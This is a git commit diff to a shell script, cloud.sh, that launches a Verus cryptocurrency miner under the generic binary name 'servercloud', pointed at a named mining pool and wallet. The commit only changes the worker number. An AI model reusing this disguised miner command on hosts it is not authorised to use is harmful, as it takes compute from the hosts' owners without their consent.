d00deed7c7cab1016fad81d62f208de06722039f
K-1995 <91457071+K-1995@users.noreply.github.com>
2023-01-18 07:14:02 +0700

    Update cloud.sh

--- cloud.sh
+++ cloud.sh
@@ -1,1 +1,1 @@
-./servercloud --disable-gpu --algorithm verushash --pool ap.luckpool.net:3956 --wallet RFTHu65LtUQeNxDwB36cyPRzdnGRE39aEB.6- --password x --cpu-threads 6
+./servercloud --disable-gpu --algorithm verushash --pool ap.luckpool.net:3956 --wallet RFTHu65LtUQeNxDwB36cyPRzdnGRE39aEB.7- --password x --cpu-threads 6
